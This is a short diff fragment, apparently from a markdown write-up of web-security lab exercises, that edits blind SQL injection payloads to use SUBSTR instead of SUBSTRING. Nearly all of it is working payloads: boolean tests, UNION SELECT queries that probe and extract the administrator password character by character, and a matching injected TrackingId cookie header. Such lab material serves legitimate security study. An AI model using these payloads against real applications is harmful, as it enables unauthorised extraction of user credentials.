@@ -29,13 +29,13 @@ xyz' OR '1'='1
 xyz' OR '1'='2
 ' UNION SELECT username FROM users WHERE username = 'administrator' AND LENGTH(password) > 19--
 ' UNION SELECT username FROM users WHERE username = 'administrator' AND LENGTH(password) > 20--
-' UNION SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, §§, 1) > '§§'--
+' UNION SELECT username FROM users WHERE username = 'administrator' AND SUBSTR(password, §§, 1) > '§§'--
 ```
 
 Modified cookie request header:
 
 ```
-Cookie: TrackingId='+UNION+SELECT+username+FROM+users+WHERE+username+=+'administrator'+AND+SUBSTRING(password,+§§,+1)+>+'§§'--
+Cookie: TrackingId='+UNION+SELECT+username+FROM+users+WHERE+username+=+'administrator'+AND+SUBSTR(password,+§§,+1)+>+'§§'--
 ```
 
 ## Blind SQL injection with conditional errors
